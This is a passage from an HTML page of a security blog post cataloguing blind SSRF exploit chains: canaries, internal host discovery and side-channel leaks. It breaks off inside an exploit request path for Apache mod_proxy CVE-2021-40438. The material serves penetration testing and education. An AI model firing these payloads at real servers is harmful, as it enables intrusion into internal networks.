@@ -1,0 +1,1177 @@
+<!DOCTYPE html>
+<html>
+<head>
+    
+    <script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+    new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
+    j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
+    'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
+    })(window,document,'script','dataLayer','UA-122322905-3');</script>
+    
+
+    <!-- Required meta tags -->
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <title>A Glossary of Blind SSRF Chains &#8211; Assetnote</title>
+    <link rel="dns-prefetch" href="//maxcdn.bootstrapcdn.com">
+    <link rel="dns-prefetch" href="//cdnjs.cloudflare.com">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <!-- Meta Share -->
+    <meta property="og:title" content="A Glossary of Blind SSRF Chains" />
+    
+    <meta property="og:type" content="website" />
+    <meta name="description" content="Application security issues found by Assetnote">
+    <meta name="robots" content="all">
+    <meta name="author" content="Assetnote Team">
+    
+    <meta name="keywords" content="">
+    <link rel="canonical" href="https://blog.assetnote.io/2021/01/13/blind-ssrf-chains/">
+    <link rel="alternate" type="application/rss+xml" title="RSS Feed for Assetnote" href="/feed.xml" />
+
+    <!-- CSS Files -->
+    <!-- AN Fonts -->
+    <link rel="stylesheet" href="/css/global/an-fonts.css?202402191423">
+    <link href="https://fonts.googleapis.com/css?family=Product+Sans:300,400,700" rel="stylesheet">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Ubuntu+Mono&display=swap" rel="stylesheet">
+    <!-- build:css css/app.min.css -->
+    <!-- Bootstrap CSS -->
+    <link rel="stylesheet" href="/css/global/bootstrap.min.css?202402191423">
+    <!-- Syntax Highlighting -->
+    <link rel="stylesheet" href="/css/global/syntax.css?202402191423">
+    <!-- Social Icon CSS -->
+    <link rel="stylesheet" href="/css/global/fa-social.css?202402191423">
+    <!-- Plugins -->
+    <link rel="stylesheet" href="/css/global/plugins/icon-font.css?202402191423">
+    <!-- Main CSS -->
+    <link rel="stylesheet" href="/css/styles.css?202402191423" type="text/css">
+    <link rel="stylesheet" href="/css/prism.css?202402191423" type="text/css">
+    <!-- /build -->
+    <script src="/js/global/jquery-3.2.1.min.js?202402191423"></script>
+    <!-- Bootstrap JS -->
+    <script src="/js/global/bootstrap.bundle.min.js?202402191423"></script>
+    <script src="/js/script.js?202402191423"></script>
+    <script src="/js/prism.js?202402191423"></script>
+    <!-- MathJax -->
+    
+
+    <!-- Verifications -->
+    
+    
+
+    <!-- Open Graph -->
+    <!-- From: https://github.com/mmistakes/hpstr-jekyll-theme/blob/master/_includes/head.html -->
+    <meta property="og:locale" content="en_US">
+    <meta property="og:type" content="article">
+    <meta property="og:title" content="A Glossary of Blind SSRF Chains">
+    <meta property="og:description" content="Application security issues found by Assetnote">
+    <meta property="og:url" content="https://blog.assetnote.io/2021/01/13/blind-ssrf-chains/">
+    <meta property="og:site_name" content="Assetnote">
+    <meta property="og:image" content="https://blog.assetnote.io/images/logo-small.png">
+
+    <!-- Twitter Card -->
+    <meta name="twitter:card" content="summary" />
+    
+        <meta name="twitter:site" content="@assetnote" />
+        <meta name="twitter:creator" content="@assetnote" />
+    
+    <meta name="twitter:title" content="A Glossary of Blind SSRF Chains" />
+    <meta name="twitter:description" content="Application security issues found by Assetnote" />
+    <meta name="twitter:url" content="https://blog.assetnote.io/2021/01/13/blind-ssrf-chains/" />
+    <meta name="twitter:image" content="https://blog.assetnote.io/images/logo-small.png" />
+
+    <!-- Icons -->
+    <link rel="icon" type="image/x-icon" href="/favicon.ico?v=2"> 
+    <link rel="apple-touch-icon" sizes="57x57" href="/apple-touch-icon-57x57.png?v=2">
+    <link rel="apple-touch-icon" sizes="114x114" href="/apple-touch-icon-114x114.png?v=2">
+    <link rel="apple-touch-icon" sizes="72x72" href="/apple-touch-icon-72x72.png?v=2">
+    <link rel="apple-touch-icon" sizes="144x144" href="/apple-touch-icon-144x144.png?v=2">
+    <link rel="apple-touch-icon" sizes="60x60" href="/apple-touch-icon-60x60.png?v=2">
+    <link rel="apple-touch-icon" sizes="120x120" href="/apple-touch-icon-120x120.png?v=2">
+    <link rel="apple-touch-icon" sizes="76x76" href="/apple-touch-icon-76x76.png?v=2">
+    <link rel="apple-touch-icon" sizes="152x152" href="/apple-touch-icon-152x152.png?v=2">
+    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon-180x180.png?v=2">
+    <link rel="icon" type="image/png" href="/favicon-16x16.png?v=2" sizes="16x16">
+    <link rel="icon" type="image/png" href="/favicon-32x32.png?v=2" sizes="32x32">
+
+    
+    <script type="text/javascript">
+        (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+        m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+        })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+        ga('create', 'UA-122322905-3', 'auto');
+        ga('send', 'pageview');
+    </script>
+    
+    <script>
+        !function(t){if(window.ko)return;window.ko=[],["identify","track","removeListeners","open","on","off","qualify","ready"].forEach(function(t){ko[t]=function(){var n=[].slice.call(arguments);return n.unshift(t),ko.push(n),ko}});var n=document.createElement("script");n.async=!0,n.setAttribute("src","https://cdn.getkoala.com/v1/pk_a39c13e7cbab005ae0f3a62c1264b27faae7/sdk.js"),(document.body || document.head).appendChild(n)}();
+    </script>
+</head>
+
+<body class="site" id="top">
+  
+  <noscript><iframe src="https://www.googletagmanager.com/ns.html?id=UA-122322905-3"
+height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
+  
+	
+
+  <nav class="navbar navbar-expand-lg navbar-light bg-dark">
+  <div class="container">
+      <a class="navbar-brand" href="https://assetnote.io/">
+          <img src="/images/global/White-AN-Transparent.svg?202402191423" width="50%" class="logo-dark" alt="Assetnote Logo" />
+      </a>
+      <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#site-nav" aria-controls="site-nav" aria-expanded="false"
+          aria-label="Toggle navigation">
+          <span class="navbar-toggler-icon navbar-toggler-icon-white"></span>
+      </button>
+
+      <div class="collapse navbar-collapse" id="site-nav">
+        <ul class="navbar-nav text-sm-left ml-auto">
+            <li class="nav-item">
+                <a class="nav-link white" href="https://assetnote.io">← Back to assetnote.io</a>
+            </li>
+            <li class="nav-item text-center">
+                <a href="https://www.assetnote.io/demo" class="btn align-middle btn-primary my-2 my-lg-0 mono-font">Request A Demo</a>
+            </li>
+        </ul>
+
+    </div>
+  </div>
+</nav>
+  
+
+<!-- hero -->
+
+<!-- Matches width of main blog content by using same containers -->
+<div class="section pb-0 pt-4 grey-bg">
+  <div class="container gradient-enable">
+    <div class="row justify-content-center overpass-body">
+      <div class="col-lg-8">
+        <a href="/">← Back to Blog</a>
+      </div>
+    </div>
+  </div>
+</div>
+
+<section class="jumbotron sub-page text-center d-flex align-items-center py-5" id="home">  
+  <div class="container">
+      <h1 class="display-4 my-5 text-an-gradient">A Glossary of Blind SSRF Chains</h1>
+      <p class="lead my-3 date-color">Jan 13, 2021</p>
+  </div>
+  <!-- // end .scroll-down -->
+</section>
+
+
+<!-- <div class="post-header mb2">
+  <h1>A Glossary of Blind SSRF Chains</h1>
+  <span class="post-meta">Jan 13, 2021</span><br>
+  
+  <span class="post-meta small">
+  
+    12 minute read
+  
+  </span>
+</div> -->
+
+<div class="section my-4" id="blog">
+  <div class="container gradient-enable">
+      <div class="row justify-content-center overpass-body">
+        <div class="col-lg-8">
+          <table>
+  <thead>
+    <tr>
+      <th style="text-align: center"><img src="/images/blind-ssrf-chains.png" alt="" width="80%" /></th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td style="text-align: center"> </td>
+    </tr>
+  </tbody>
+</table>
+
+<h1 id="introduction">Introduction</h1>
+<h2 id="what-is-server-side-request-forgery-ssrf">What is Server Side Request Forgery (SSRF)?</h2>
+
+<p>Server Side Request Forgery occurs when you can coerce a server to make arbitrary requests on your behalf. As the requests are being made by the server, it may be possible to access internal resources due to where the server is positioned in the network. On cloud environments, SSRF poses a more significant risk due to the presence of <a href="https://gist.github.com/jhaddix/78cece26c91c6263653f31ba453e273b">metadata endpoints</a> that may contain sensitive credentials or secrets.</p>
+
+<h2 id="blind-ssrf">Blind SSRF</h2>
+
+<p>When exploiting server-side request forgery, we can often find ourselves in a position where the response cannot be read. In the industry, this behaviour is often referred to as “Blind SSRF”. In such situations, how do we prove impact? This was an interesting discussion that was sparked by Justin Gardner on Twitter:</p>
+
+<blockquote class="twitter-tweet" data-theme="dark"><p lang="en" dir="ltr">I&#39;ve been finding a large amount of Blind SSRFs recently. What kind of one-shot RCE&#39;s have you guys used as pivots for these in the past? I&#39;ve got access to some Kafka and a bunch of other things. <a href="https://twitter.com/nnwakelam?ref_src=twsrc%5Etfw">@nnwakelam</a> <a href="https://twitter.com/thedawgyg?ref_src=twsrc%5Etfw">@thedawgyg</a></p>&mdash; Justin Gardner (@Rhynorater) <a href="https://twitter.com/Rhynorater/status/1349290375312154625?ref_src=twsrc%5Etfw">January 13, 2021</a></blockquote>
+<script async="" src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>
+
+<p>If you can reach internal resources, there are a number of potential exploit chains that can be executed to prove impact. This blog post attempts to go into detail for each known exploit chain when leveraging blind SSRF, and will be updated as more techniques are discovered and shared.</p>
+
+<p>You can find a GitHub repo with all of these techniques here: <a href="https://github.com/assetnote/blind-ssrf-chains">Blind SSRF Chains</a>.</p>
+
+<p>Please send us a pull request on GitHub if you would like any more techniques to be added to this glossary.</p>
+
+<h2 id="ssrf-canaries">SSRF Canaries</h2>
+
+<blockquote class="twitter-tweet" data-conversation="none" data-theme="dark"><p lang="en" dir="ltr">I tend to call them SSRF canaries, when chaining a blind SSRF to another SSRF internally which makes an additional call externally, or by an app-specific open redir or blind XXE. Confluence, Artifactory, Jenkins and JAMF have some that works well.</p>&mdash; Frans Rosén (@fransrosen) <a href="https://twitter.com/fransrosen/status/1349397387920502786?ref_src=twsrc%5Etfw">January 13, 2021</a></blockquote>
+<script async="" src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>
+
+<p>In order to validate that you can interact with internal services or applications, you can utilise “SSRF canaries”.</p>
+
+<p>This is when we can request an internal URL that performs another SSRF and calls out to your canary host. If you receive a request to your canary host, it means that you have successfully hit an internal service that is also capable making outbound requests.</p>
+
+<p>This is an effective way to verify that an SSRF vulnerability has access to a internal networks or applications, and to also verify the presence of certain software existing on the internal network. You can also potentially pivot to more sensitive parts of an internal network using an SSRF canary, depending on where it sits.</p>
+
+<h2 id="using-dns-datasources-and-altdns-to-find-internal-hosts">Using DNS datasources and AltDNS to find internal hosts</h2>
+
+<p>With the goal being to find as many internal hosts as possible, DNS datasources can be utilised to find all records that point to internal hosts.</p>
+
+<p>On cloud environments, we often see ELBs that are pointing to hosts inside an internal VPC. Depending on which VPC the asset you’re targeting is in, it may be possible to access other hosts within the same VPC.</p>
+
+<p>For example, consider the following host has been discovered from DNS datasources:</p>
+
+<pre><code class="language-bash">livestats.target.com -&gt; internal-es-livestats-298228113.us-west-2.elb.amazonaws.com -&gt; 10.0.0.82
+</code></pre>
+
+<p>You can make an assumption that the <code>es</code> stands for Elasticsearch, and then perform further attacks on this host. You can also spray all of these blind SSRF payloads across all of the “internal” hosts that have been identified through this method. This is often effective.</p>
+
+<p>To find more internal hosts, I recommend taking all of your DNS data and then using something like <a href="https://github.com/infosec-au/altdns">AltDNS</a> to generate permutations and then resolve them with a <a href="https://github.com/blechschmidt/massdns">fast DNS bruteforcer</a>.</p>
+
+<p>Once this is complete, identify all of the newly discovered internal hosts and use them as a part of your blind SSRF chain.</p>
+
+<h2 id="side-channel-leaks">Side Channel Leaks</h2>
+
+<p>When exploiting blind SSRF vulnerabilities, you may be able to leak some information about the response being returned. For example, let’s say that you have blind SSRF via an XXE, the error messages may indicate whether or not:</p>
+
+<ul>
+  <li>A response was returned</li>
+</ul>
+
+<p><code>Error parsing request: System.Xml.XmlException: Expected DTD markup was not found. Line 1, position 1.</code></p>
+
+<p>vs.</p>
+
+<ul>
+  <li>Host and port are unreachable</li>
+</ul>
+
+<p><code>Error parsing request: System.Net.WebException: Unable to connect to the remote server</code></p>
+
+<p>Similarly, outside of XXEs, a web application could also have a side channel leak that can be ascertained by inspecting differences within the:</p>
+
+<ul>
+  <li><strong>Response status code</strong>:</li>
+</ul>
+
+<p>Online internal asset:port responds with <code>200 OK</code> vs offline internal asset:port <code>500 Internal Server Error</code></p>
+
+<ul>
+  <li><strong>Response contents</strong>:</li>
+</ul>
+
+<p>The response size in bytes is smaller or bigger depending on whether or not the URL you are trying to request is reachable.</p>
+
+<ul>
+  <li><strong>Response timing</strong>:</li>
+</ul>
+
+<p>The response times are slower or faster depending on whether or not the URL you are trying to request is reachable.</p>
+
+<hr />
+
+<h1 id="techniques">Techniques</h1>
+<p><strong>Possible via HTTP(s)</strong></p>
+
+<ul>
+  <li><a href="/2021/01/13/blind-ssrf-chains/#modproxy">Apache mod_proxy</a></li>
+  <li><a href="/2021/01/13/blind-ssrf-chains/#elasticsearch">Elasticsearch</a></li>
+  <li><a href="/2021/01/13/blind-ssrf-chains/#weblogic">Weblogic</a></li>
+  <li><a href="/2021/01/13/blind-ssrf-chains/#consul">Hashicorp Consul</a></li>
+  <li><a href="/2021/01/13/blind-ssrf-chains/#shellshock">Shellshock</a></li>
+  <li><a href="/2021/01/13/blind-ssrf-chains/#druid">Apache Druid</a></li>
+  <li><a href="/2021/01/13/blind-ssrf-chains/#solr">Apache Solr</a></li>
+  <li><a href="/2021/01/13/blind-ssrf-chains/#peoplesoft">PeopleSoft</a></li>
+  <li><a href="/2021/01/13/blind-ssrf-chains/#struts">Apache Struts</a></li>
+  <li><a href="/2021/01/13/blind-ssrf-chains/#jboss">JBoss</a></li>
+  <li><a href="/2021/01/13/blind-ssrf-chains/#confluence">Confluence</a></li>
+  <li><a href="/2021/01/13/blind-ssrf-chains/#jira">Jira</a></li>
+  <li><a href="/2021/01/13/blind-ssrf-chains/#atlassian-products">Other Atlassian Products</a></li>
+  <li><a href="/2021/01/13/blind-ssrf-chains/#opentsdb">OpenTSDB</a></li>
+  <li><a href="/2021/01/13/blind-ssrf-chains/#jenkins">Jenkins</a></li>
+  <li><a href="/2021/01/13/blind-ssrf-chains/#hystrix">Hystrix Dashboard</a></li>
+  <li><a href="/2021/01/13/blind-ssrf-chains/#w3">W3 Total Cache</a></li>
+  <li><a href="/2021/01/13/blind-ssrf-chains/#docker">Docker</a></li>
+  <li><a href="/2021/01/13/blind-ssrf-chains/#redisexporter">Gitlab Prometheus Redis Exporter</a></li>
+</ul>
+
+<p><strong>Possible via Gopher</strong></p>
+
+<ul>
+  <li><a href="/2021/01/13/blind-ssrf-chains/#redis">Redis</a></li>
+  <li><a href="/2021/01/13/blind-ssrf-chains/#memcache">Memcache</a></li>
+  <li><a href="/2021/01/13/blind-ssrf-chains/#tomcat">Apache Tomcat</a></li>
+</ul>
+
+<p><strong>Tools</strong></p>
+
+<ul>
+  <li><a href="/2021/01/13/blind-ssrf-chains/#gopherus">Gopherus</a></li>
+  <li><a href="/2021/01/13/blind-ssrf-chains/#ssrfproxy">SSRF Proxy</a></li>
+</ul>
+
+<hr />
+
+<p><strong>Possible via HTTP(s)</strong></p>
+
+<div id="modproxy"></div>
+
+<h2 id="apache-mod_proxy">Apache mod_proxy</h2>
+
+<p><strong>Commonly bound port: 80,443</strong></p>
+
+<p><strong>SSRF Canary: Apache mod_proxy SSRF (CVE-2021-40438)</strong></p>
+
+<p>Affects Apache &lt;= 2.4.48.</p>
+
+<p>A reference for this bug can be found here: <a href="https://firzen.de/building-a-poc-for-cve-2021-40438">https://firzen.de/building-a-poc-for-cve-2021-40438</a>.</p>
+
+<pre><code class="language-http">/?unix:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA